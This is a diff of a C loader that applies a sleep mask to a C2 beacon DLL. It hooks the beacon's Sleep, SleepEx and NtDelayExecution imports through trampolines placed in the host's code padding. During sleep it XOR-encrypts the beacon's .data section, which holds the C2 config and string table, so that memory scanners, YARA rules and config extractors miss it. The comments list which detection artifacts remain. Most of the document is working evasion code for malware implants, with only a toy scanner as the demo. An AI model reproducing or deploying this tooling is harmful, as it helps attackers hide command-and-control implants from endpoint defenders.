@@ -1,57 +1,70 @@
-// x86_64-w64-mingw32-gcc -shared -Wall -Wextra -fcf-protection -o beacon.dll beacon.c
+// x86_64-w64-mingw32-gcc -shared -Wall -Wextra -fcf-protection -o beacon.dll beacon.c -lntdll
 // x86_64-w64-mingw32-gcc -Wall -Wextra -fcf-protection -o faulty.exe faulty.c
 //
-// faulty: the IAT-hook trampoline.
+// faulty: the IAT-hook trampoline, data-region variant.
 //
-// First cut fused the payload and the mask into one 18-byte loop with
-// a baked-in call through a vtable.  Proved the shape, but you can't
-// swap in a real beacon without rewriting both halves.
+// Prior sleep masks encrypt the code region because the beacon IS
+// shellcode.  A DLL beacon is a different shape: its code pages are
+// MEM_IMAGE-backed and match on disk, so the scanner's code heuristic
+// already passes.  The detection surface is the C2 config and string
+// table in .data (what YARA and config extractors match on).
 //
-// This version hooks the beacon's own sleep import instead.  We walk
-// its IAT, find the Sleep entry, and point it at a trampoline living
-// in a host .text padding run.  The beacon calls "Sleep", lands in
-// our stub, and never knows:
+// This version masks the beacon's .data section during sleep:
 //
-//     mask(); RealSleep(ms); decrypt(); ret     back into the beacon
+//     mask(data); RealSleep(ms); decrypt(data); ret
 //
-// One 83-byte stub.  Saves rcx/rdx/r8/r9 across mask(), restores
-// them for the real call, stashes rax across decrypt(), returns.
-// Same code for Sleep, SleepEx, WaitForSingleObject,
-// NtDelayExecution — pick the IAT entry, not the stub.  State
-// pointer is an imm64 patched in at setup; no VEH, no masker thread,
-// no CAS machine; program order on the beacon's own thread is the
-// whole lock.
+// Same 83-byte trampoline, same IAT hook, different target region.
+// Three prior residuals close:
 //
-// The beacon's call pushes its return onto both stacks; the
-// trampoline's ret pops exactly that.  CET-safe by construction.
+//   - Stack: beacon_main's frame points into .text that stays RX
+//     and matches on-disk.  No frame into a masked region.
+//   - Execute: .text keeps RX for the whole sleep window.
+//   - ETW churn: .data is already RW, so no NtProtectVirtualMemory.
 //
-// Three regions, same page story as before:
+// The XOR pass skips the IAT range (must stay readable so the
+// hooked import resolves on the next call).
 //
-//   - beacon .text flips RW while masked, RX at rest;
-//   - the trampoline sits on a different page so it can still run
-//     while the beacon's pages are RW;
-//   - state prefers a host .data zero-run (MEM_IMAGE VAD), falls
-//     back to private RW.
+// Refcount + wake ordering: multiple threads can hit the hooked sleep.
+// First in masks; the first waker decrypts (the beacon is active, so the
+// data must be readable by the time any waker resumes beacon code).
+// sleepers is the refcount; state is a 3-valued latch:
+//   0 = plain, 1 = masked, 2 = unmask in flight.
+// The waker that CASes state 1->2 performs the unmask.  Concurrent
+// wakers that lose the latch spin on state==2 until it completes, so no
+// thread reads .data mid-unmask. That closes the unmask-completion race
+// the single-thread path couldn't show.  The mask side has no in-flight
+// state: a later sleeper can only wake once its own sleep has elapsed, so
+// it always lands after the first sleeper's mask already finished.  That
+// ordering is guaranteed by sleep duration, not the latch.
+//
+// Sleep targets: Sleep/SleepEx share trampoline A (calls fn_sleep, the
+// kernel32 original; a SleepEx alertable bit is dropped, matching the
+// single-stub design).  NtDelayExecution has a different signature and
+// return, so it gets trampoline B (calls fn_ntdelay, the ntdll original).
+// Both point at the same state struct (one masked region, one key, one
+// refcount) and differ only in which real sleep they invoke.
 //
 // While sleeping the stack reads:
 //
 //     ntdll <- kernel32!Sleep <- trampoline (host .text) <- beacon_main
 //
-// The loader binary is in none of those frames.  mask() and decrypt()
-// have either returned or haven't run yet.
+// beacon_main's frame points into .text (RX, on-disk match).
+// The loader binary is in none of those frames.
 //
-// Still visible, to be honest:
+// Still visible:
 //   (a) the patched IAT entry;
 //   (b) the trampoline byte-diff in the host (ModifiedModule);
 //   (c) raw state pointer sitting in the trampoline code;
-//   (d) two NtProtectVirtualMemory calls per cycle (ETW);
-//   (e) everything else on the beacon's .text pages loses execute
-//       for the sleep window;
-//   (f) a private-RW VAD when no .data slot turns up.
+//   (d) heap C2 buffers, scoped out of the mask; the beacon zeroes each
+//       after use so it doesn't sit at rest (a buffer that outlives its use
+//       would still be visible);
+//   (e) a private-RW VAD when no host .data slot turns up;
+//   (f) the beacon DLL itself (on disk or stomped).
 //
-// Demo: beacon.dll is a stand-in that loops on Sleep(1500).  The
-// scanner thread watches region bytes and tick counts.  Neither ships.
-// So this is a proof of concept to base real testing on...
+// Demo: beacon.dll is a representative C2 beacon, with a main loop (Sleep)
+// and a worker thread (NtDelayExecution), each doing C2 work on a heap
+// buffer it zeroes after use.  The scanner thread watches the config byte
+// and the mask state.  Neither ships.
 //
 #include <windows.h>
 #include <string.h>
@@ -62,23 +75,31 @@
 // ---- state: function pointers for the trampoline + masking metadata ----------
 typedef struct {
     void *fn_mask;                       // +0x00  tramp: call [rbx+0x00]
-    void *fn_sleep;                      // +0x08  tramp: call [rbx+0x08]
+    void *fn_sleep;                      // +0x08  tramp A: call [rbx+0x08]
     void *fn_decrypt;                    // +0x10  tramp: call [rbx+0x10]
-    void *region;                        // +0x18  beacon .text base
-    size_t region_len;                   // +0x20  beacon .text length
-    volatile LONG state;                 // +0x28  display label (0=plain 1=masked)
-    unsigned char key[16];               // +0x2C  only valid while masked
+    void *fn_ntdelay;                    // +0x18  tramp B: call [rbx+0x18]
+    void *region;                        // +0x20  beacon .data base
+    size_t region_len;                   // +0x28  beacon .data length
+    volatile LONG state;                 // +0x30  0=plain 1=masked 2=unmasking
+    volatile LONG sleepers;              // +0x34  threads currently in sleep
+    unsigned char key[16];               // +0x38  only valid while masked
+    unsigned char *iat_base;             // +0x48  IAT start (NULL = no overlap)
+    size_t iat_len;                      // +0x50  IAT byte length
 } beacon_state;
 _Static_assert(offsetof(beacon_state, fn_mask)    == 0x00, "tramp call [rbx+0x00]");
-_Static_assert(offsetof(beacon_state, fn_sleep)   == 0x08, "tramp call [rbx+0x08]");
+_Static_assert(offsetof(beacon_state, fn_sleep)   == 0x08, "tramp A call [rbx+0x08]");
 _Static_assert(offsetof(beacon_state, fn_decrypt) == 0x10, "tramp call [rbx+0x10]");
+_Static_assert(offsetof(beacon_state, fn_ntdelay) == 0x18, "tramp B call [rbx+0x18]");
 
-// ---- sleep targets: which IAT import to hook ---------------------------------
+// ---- sleep targets: which IAT imports to hook --------------------------------
+// Sleep/SleepEx share trampoline A (signature-compatible; the trampoline
+// preserves all four arg regs).  NtDelayExecution has a different signature
+// and return, so it gets trampoline B.  WFSO would need its own trampoline;
+// the demo beacon doesn't import it, so it's not added.
 typedef struct { const char *dll; const char *func; } sleep_target;
 static const sleep_target TARGETS[] = {
     { "kernel32.dll", "Sleep" },
     { "kernel32.dll", "SleepEx" },
-    { "kernel32.dll", "WaitForSingleObject" },
     { "ntdll.dll",    "NtDelayExecution" },
 };
 #define NTARGETS (int)(sizeof TARGETS / sizeof TARGETS[0])
@@ -92,7 +113,7 @@ static unsigned char g_cookie[8];
 static unsigned long long g_desc_obf;
 #define DESC() ((beacon_state *)(uintptr_t)(g_desc_obf ^ (*(unsigned long long *)g_cookie & 0x0000FFFFFFFFFFFFULL)))
 
-// ---- NtProtectVirtualMemory: below the kernel32/kernelbase hook layers -------
+// ---- NtProtectVirtualMemory: still needed for trampoline page setup ----------
 typedef LONG (NTAPI *NtProtect_t)(HANDLE, PVOID *, SIZE_T *, ULONG, ULONG *);
 static NtProtect_t pNtProtectVirtualMemory;
 static int vp(void *base, size_t len, DWORD prot) {
@@ -106,27 +127,51 @@ static int vp(void *base, size_t len, DWORD prot) {
 typedef void (NTAPI *ProcessPrng_t)(PVOID, size_t);
 static ProcessPrng_t pProcessPrng;
 
-// ---- mask / decrypt: sequential, one thread, program order is the lock -------
+// ---- XOR the data region, skipping the IAT if it overlaps --------------------
+static void xor_region(beacon_state *d) {
+    unsigned char *base = (unsigned char *)d->region;
+    size_t len = d->region_len;
+
+    if (d->iat_base && d->iat_base >= base && d->iat_base < base + len) {
+        size_t before = (size_t)(d->iat_base - base);
+        size_t skip_end = before + d->iat_len;
+        if (skip_end > len) skip_end = len;
+        for (size_t i = 0; i < before; i++)
+            base[i] ^= d->key[i % 16];
+        for (size_t i = skip_end; i < len; i++)
+            base[i] ^= d->key[i % 16];
+    } else {
+        for (size_t i = 0; i < len; i++)
+            base[i] ^= d->key[i % 16];
+    }
+}
+
+// ---- mask / decrypt: refcounted, no VirtualProtect (.data is already RW) -----
+// state: 0=plain 1=masked 2=unmask-in-flight.  First sleeper masks; first
+// waker unmasks; concurrent wakers spin on state==2 until the unmask is done,
+// so no thread reads .data mid-XOR (closes the XOR-completion race).
 static void mask(void) {
     beacon_state *d = DESC();
+    if (InterlockedIncrement(&d->sleepers) != 1) return;
     pProcessPrng(d->key, sizeof d->key);
-    if (!vp(d->region, d->region_len, PAGE_READWRITE)) {
-        SecureZeroMemory(d->key, sizeof d->key);
-        return;
-    }
-    unsigned char *p = d->region;
-    for (size_t i = 0; i < d->region_len; i++) p[i] ^= d->key[i % 16];
-    d->state = 1;
+    xor_region(d);
+    InterlockedExchange(&d->state, 1);
 }
 
 static void decrypt(void) {
     beacon_state *d = DESC();
-    if (!vp(d->region, d->region_len, PAGE_READWRITE)) return;
-    unsigned char *p = d->region;
-    for (size_t i = 0; i < d->region_len; i++) p[i] ^= d->key[i % 16];
-    SecureZeroMemory(d->key, sizeof d->key);
-    vp(d->region, d->region_len, PAGE_EXECUTE_READ);
-    d->state = 0;
+    InterlockedDecrement(&d->sleepers);
+    if (InterlockedCompareExchange(&d->state, 2, 1) == 1) {
+        // Won the latch (1 -> 2): I perform the unmask.  state==2 tells
+        // concurrent wakers to hold until this pass completes.
+        xor_region(d);
+        SecureZeroMemory(d->key, sizeof d->key);
+        InterlockedExchange(&d->state, 0);          // 2 -> plain
+    } else {
+        // Lost: state is 2 (unmask in flight) or 0 (already plain).  Spin
+        // until the decrypter finishes so I read fully-unmasked .data.
+        while (d->state == 2) YieldProcessor();
+    }
 }
 
 // ---- trampoline (83 bytes) ---------------------------------------------------
@@ -177,7 +222,8 @@ static const unsigned char TRAMP[] = {
     0xC3,
 };
 #define TRAMP_LEN       (sizeof TRAMP)
-#define TRAMP_STATE_OFF 11
+#define TRAMP_STATE_OFF 11     // imm64 of `mov rbx, <state>`
+#define TRAMP_SLEEP_OP  63    // operand of `call [rbx+0x08]`; 0x18 for tramp B
 _Static_assert(sizeof TRAMP == 83, "trampoline length pinned");
 
 // ---- find a padding run (0xCC or 0x90) in a code section ---------------------
@@ -203,7 +249,7 @@ static int find_tramp_slot(unsigned char **tramp_out) {
         for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
             if (!(s->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
             if (find_run((unsigned char *)m + s->VirtualAddress,
-                         s->Misc.VirtualSize, (DWORD)TRAMP_LEN, tramp_out))
+                         s->Misc.VirtualSize, (DWORD)(2 * TRAMP_LEN), tramp_out))
                 return 1;
         }
     }
@@ -283,13 +329,14 @@ static int hook_iat(HMODULE mod, const char *dll_name, const char *func_name,
     return 0;
 }
 
-// ---- locate the beacon's first code section ----------------------------------
-static int find_beacon_text(HMODULE mod, void **base, size_t *len) {
+// ---- locate the beacon's first writable data section -------------------------
+static int find_beacon_data(HMODULE mod, void **base, size_t *len) {
     IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mod;
     IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)mod + dos->e_lfanew);
     IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
-        if (!(s->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
+        if (!(s->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)) continue;
+        if (!(s->Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
         *base = (unsigned char *)mod + s->VirtualAddress;
         *len  = s->Misc.VirtualSize;
         return 1;
@@ -297,22 +344,52 @@ static int find_beacon_text(HMODULE mod, void **base, size_t *len) {
     return 0;
 }
 
+// ---- locate the IAT bounds (for exclusion from the XOR pass) -----------------
+static int find_iat_range(HMODULE mod, unsigned char **base, size_t *len) {
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mod;
+    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)mod + dos->e_lfanew);
+    IMAGE_DATA_DIRECTORY *dir =
+        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT];
+    if (!dir->VirtualAddress || !dir->Size) return 0;
+    *base = (unsigned char *)mod + dir->VirtualAddress;
+    *len  = dir->Size;
+    return 1;
+}
+
 // ---- scanner (DEMO ONLY) -----------------------------------------------------
+// Stands in for a memory scanner / EDR.  The mask state is the reliable
+// indicator; the config byte is just color, read from beacon_config at its
+// own address (not .data[0]).  'C' means plain; anything else is ciphertext.
+// The sleepers count shows the refcount holding as both threads (Sleep +
+// NtDelayExecution) enter the window.
+typedef struct {
+    volatile unsigned long long *ticks;
+    unsigned char *config;      // beacon_config[0]; 'C' when plain
+} scan_args;
+
 DWORD WINAPI scanner(LPVOID a) {
-    volatile unsigned long long *ticks = (volatile unsigned long long *)a;
+    scan_args *sa = (scan_args *)a;
     beacon_state *d = DESC();
-    int last = -2; unsigned long long last_tick = 0;
+    int last_state = -1; long last_sleepers = -1;
+    unsigned long long last_tick = 0;
     for (;;) {
-        unsigned char b = 0; SIZE_T got = 0;
-        ReadProcessMemory(GetCurrentProcess(), d->region, &b, 1, &got);
-        if (got && (int)b != last) {
-            printf("[scan]   region[0]=%#04x (%s)\n", b,
-                   d->state ? "ciphertext" : "plaintext");
-            last = b;
+        unsigned char cb = 0;
+        if (sa->config)
+            ReadProcessMemory(GetCurrentProcess(), sa->config, &cb, 1, NULL);
+        int state = (int)d->state;
+        long sleepers = d->sleepers;
+        unsigned long long tick = sa->ticks ? *sa->ticks : 0;
+        if (state != last_state || sleepers != last_sleepers ||
+            tick != last_tick) {
+            const char *sname = state == 1 ? "MASKED"
+                            : state == 2 ? "UNMASKING" : "PLAIN";
+            printf("[scan]  %-9s  config=%02x (%s)  sleepers=%ld  tick=%llu\n",
+                   sname, cb,
+                   (sa->config && cb == 'C') ? "plaintext" : "ciphertext",
+                   sleepers, tick);
+            last_state = state; last_sleepers = sleepers; last_tick = tick;
         }
-        if (ticks && *ticks != last_tick)
-            printf("[scan]   beacon alive: tick %llu\n", (last_tick = *ticks));
-        Sleep(50);
+        Sleep(30);
     }
     return 0;
 }
@@ -351,18 +428,22 @@ int main(void) {
         return 1;
     }
 
-    // ---- find the beacon's .text (the region we'll mask) ---------------------
-    void *beacon_text = NULL; size_t beacon_text_len = 0;
-    if (!find_beacon_text(hBeacon, &beacon_text, &beacon_text_len)) {
-        printf("[setup]  beacon .text section not found\n");
+    // ---- find the beacon's .data (the region we'll mask) ---------------------
+    void *beacon_data = NULL; size_t beacon_data_len = 0;
+    if (!find_beacon_data(hBeacon, &beacon_data, &beacon_data_len)) {
+        printf("[setup]  beacon .data section not found\n");
         return 1;
     }
+
+    // ---- find the IAT range (excluded from XOR if it overlaps .data) ---------
+    unsigned char *iat_base = NULL; size_t iat_len = 0;
+    find_iat_range(hBeacon, &iat_base, &iat_len);
 
     // ---- trampoline: host .text padding (preferred) or private page ----------
     unsigned char *tramp_slot = NULL;
     int tramp_image = find_tramp_slot(&tramp_slot);
     if (!tramp_image) {
-        printf("[setup]  no %u-byte padding run — private trampoline fallback\n",
+        printf("[setup]  no %u-byte padding run; private trampoline fallback\n",
                (unsigned)TRAMP_LEN);
         tramp_slot = VirtualAlloc(NULL, 0x1000,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -385,69 +466,113 @@ int main(void) {
     }
     g_desc_obf = (unsigned long long)(uintptr_t)st ^ ck;
 
-    // ---- populate state (fn_sleep filled by hook_iat below) ------------------
+    // ---- populate state (fn_sleep/fn_ntdelay filled by hook_iat below) ------
     st->fn_mask    = (void *)mask;
     st->fn_sleep   = NULL;
+    st->fn_ntdelay = NULL;
     st->fn_decrypt = (void *)decrypt;
-    st->region     = beacon_text;
-    st->region_len = beacon_text_len;
+    st->region     = beacon_data;
+    st->region_len = beacon_data_len;
     st->state      = 0;
+    st->sleepers   = 0;
+    memset(st->key, 0, sizeof st->key);
+    st->iat_base   = iat_base;
+    st->iat_len    = iat_len;
 
-    // ---- build trampoline with patched state pointer -------------------------
-    unsigned char tramp_code[sizeof TRAMP];
-    memcpy(tramp_code, TRAMP, sizeof TRAMP);
+    // ---- build both trampolines with patched state pointer -------------------
+    // tramp A at slot+0 (call [rbx+0x08] = fn_sleep); tramp B at slot+0x53
+    // (call [rbx+0x18] = fn_ntdelay).  They share the state struct and differ
+    // only in the sleep-call operand (TRAMP_SLEEP_OP).
     uintptr_t st_addr = (uintptr_t)st;
-    memcpy(tramp_code + TRAMP_STATE_OFF, &st_addr, 8);
-
-    if (tramp_image) {
-        if (!write_text(tramp_slot, tramp_code, TRAMP_LEN)) {
-            printf("[setup]  trampoline write to host .text failed\n");
-            return 1;
-        }
-    } else {
-        memcpy(tramp_slot, tramp_code, TRAMP_LEN);
-        if (!vp(tramp_slot, TRAMP_LEN, PAGE_EXECUTE_READ)) {
-            printf("[setup]  trampoline page flip failed\n");
-            return 1;
+    unsigned char *trampA = tramp_slot;
+    unsigned char *trampB = tramp_slot + TRAMP_LEN;
+    // Guard: TRAMP_SLEEP_OP must be the displacement byte of `call [rbx+...]`
+    // (preceded by the FF 53 opcode+modrm).  C static_assert can't subscript an
+    // array, so this is checked at setup: editing the trampoline and drifting
+    // the operand past offset 63 fails here instead of silently.
+    if (TRAMP[TRAMP_SLEEP_OP - 2] != 0xFF || TRAMP[TRAMP_SLEEP_OP - 1] != 0x53) {
+        printf("[setup]  trampoline layout drift: operand not at TRAMP_SLEEP_OP\n");
+        return 1;
+    }
+    for (int t = 0; t < 2; t++) {
+        unsigned char code[sizeof TRAMP];
+        memcpy(code, TRAMP, sizeof TRAMP);
+        memcpy(code + TRAMP_STATE_OFF, &st_addr, 8);
+        code[TRAMP_SLEEP_OP] = t ? 0x18 : 0x08;
+        unsigned char *dst = t ? trampB : trampA;
+        if (tramp_image) {
+            if (!write_text(dst, code, TRAMP_LEN)) {
+                printf("[setup]  trampoline write to host .text failed\n");
+                return 1;
+            }
+        } else {
+            memcpy(dst, code, TRAMP_LEN);
         }
     }
+    if (!tramp_image &&
+        !vp(tramp_slot, 2 * TRAMP_LEN, PAGE_EXECUTE_READ)) {
+        printf("[setup]  trampoline page flip failed\n");
+        return 1;
+    }
 
-    // ---- hook the beacon's sleep import -> trampoline ------------------------
+    // ---- hook each sleep import to its trampoline ----------------------------
+    // Sleep/SleepEx -> tramp A (store first original in fn_sleep);
+    // NtDelayExecution -> tramp B (store original in fn_ntdelay).
     void *real_sleep = NULL;
+    void *real_ntdelay = NULL;
     int hooked = 0;
-    for (int t = 0; t < NTARGETS && !hooked; t++) {
-        hooked = hook_iat(hBeacon, TARGETS[t].dll, TARGETS[t].func,
-                          tramp_slot, &real_sleep);
-        if (hooked)
-            printf("[setup]  hooked %s!%s -> trampoline\n",
-                   TARGETS[t].dll, TARGETS[t].func);
+    for (int t = 0; t < NTARGETS; t++) {
+        int is_nt = (strcmp(TARGETS[t].func, "NtDelayExecution") == 0);
+        void *tramp = is_nt ? trampB : trampA;
+        void **real_slot = is_nt ? &real_ntdelay : &real_sleep;
+        void *orig = NULL;
+        if (hook_iat(hBeacon, TARGETS[t].dll, TARGETS[t].func, tramp, &orig)) {
+            if (!*real_slot) *real_slot = orig;
+            hooked++;
+            printf("[setup]  hooked %s!%s -> trampoline %s\n",
+                   TARGETS[t].dll, TARGETS[t].func, is_nt ? "B" : "A");
+        }
     }
     if (!hooked) {
         printf("[setup]  no hookable sleep import found in beacon IAT\n");
         return 1;
     }
-    st->fn_sleep = real_sleep;
+    st->fn_sleep   = real_sleep;
+    st->fn_ntdelay = real_ntdelay;
 
-    // ---- sanity: trampoline must not share a page with the masked region -----
-    uintptr_t rgn_first = (uintptr_t)beacon_text >> 12;
-    uintptr_t rgn_last  = ((uintptr_t)beacon_text + beacon_text_len - 1) >> 12;
-    uintptr_t trp_page  = (uintptr_t)tramp_slot >> 12;
-    if (trp_page >= rgn_first && trp_page <= rgn_last) {
-        printf("[setup]  BUG: trampoline shares a page with masked region\n");
+    // ---- sanity: state must not overlap the masked data region ---------------
+    uintptr_t rgn_start = (uintptr_t)beacon_data;
+    uintptr_t rgn_end   = rgn_start + beacon_data_len;
+    uintptr_t st_start  = (uintptr_t)st;
+    uintptr_t st_end    = st_start + sizeof(beacon_state);
+    if (st_start < rgn_end && st_end > rgn_start) {
+        printf("[setup]  BUG: state struct overlaps masked data region\n");
         return 1;
     }
 
-    printf("[setup]  region %p (%llu bytes, beacon .text), "
-           "tramp %p (%s), state %p (%s)\n"
-           "[setup]  no VEH, no masker thread; "
-           "mask/sleep/decrypt in beacon's own program order\n",
-           beacon_text, (unsigned long long)beacon_text_len,
-           (void *)tramp_slot, tramp_image ? "image padding" : "private",
+    printf("[setup]  region %p (%llu bytes, beacon .data), state %p (%s)\n",
+           beacon_data, (unsigned long long)beacon_data_len,
            (void *)st, state_image ? "image .data" : "private RW");
+    printf("[setup]  tramp A %p (Sleep/SleepEx)   B %p (NtDelayExecution)%s\n",
+           (void *)trampA, (void *)trampB, tramp_image ? "" : "  [private]");
+    printf("[setup]  data masked during sleep; .text stays RX; "
+           "3-state latch + spin-wait; refcounted sleepers\n");
+
+    if (iat_base) {
+        int overlaps = (iat_base >= (unsigned char *)beacon_data &&
+                        iat_base < (unsigned char *)beacon_data + beacon_data_len);
+        if (overlaps)
+            printf("[setup]  IAT at %p (%llu bytes) overlaps .data; "
+                   "excluded from mask\n",
+                   (void *)iat_base, (unsigned long long)iat_len);
+    }
 
     // ---- launch --------------------------------------------------------------
+    scan_args sa;
+    sa.ticks  = ticks;
+    sa.config = (unsigned char *)GetProcAddress(hBeacon, "beacon_config");
     CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pfnBeacon, NULL, 0, NULL);
-    CreateThread(NULL, 0, scanner, (LPVOID)ticks, 0, NULL);
+    CreateThread(NULL, 0, scanner, (LPVOID)&sa, 0, NULL);
 
     Sleep(20000);
     return 0;
